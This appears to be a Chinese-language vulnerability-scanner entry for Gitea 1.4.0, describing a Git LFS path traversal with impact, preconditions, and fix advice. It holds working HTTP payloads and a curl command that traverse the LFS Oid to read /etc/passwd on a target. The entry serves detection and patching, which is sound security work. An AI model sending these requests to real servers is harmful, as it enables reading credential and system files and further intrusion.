---
id: GITEA-1.4-RCE
title: Gitea 1.4.0 目录穿越命令执行漏洞
product: gitea
vendor: Gitea
version_affected: "1.4.0"
severity: CRITICAL
tags: [rce, path_traversal, 需要认证]
fingerprint: ["Gitea"]
---

## 漏洞描述

Gitea 1.4.0 版本存在目录穿越漏洞。攻击者通过 Git LFS 对象路径穿越，可以读取服务器任意文件，进一步利用可执行任意命令。

## 影响版本

- Gitea 1.4.0

## 前置条件

- 需要创建公开仓库
- 需要执行一次服务重启
- 需要能够访问 Git LFS 接口

## 利用步骤

1. 创建公开仓库
2. 通过 LFS 接口发送包含路径穿越的 Oid
3. 访问构造的路径读取任意文件

## Payload

```http
# 添加恶意 LFS 对象
POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
Host: target:3000
Content-Type: application/vnd.git-lfs+json

{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}

# 访问读取的文件
GET /vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth HTTP/1.1
Host: target:3000
```

## 验证方法

```bash
# 检查是否能读取 /etc/passwd
curl -s "http://target:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth"
```

## 修复建议

1. 升级 Gitea 至 1.4.1+
2. 禁止 LFS Oid 中的路径穿越字符
3. 对用户输入进行严格校验
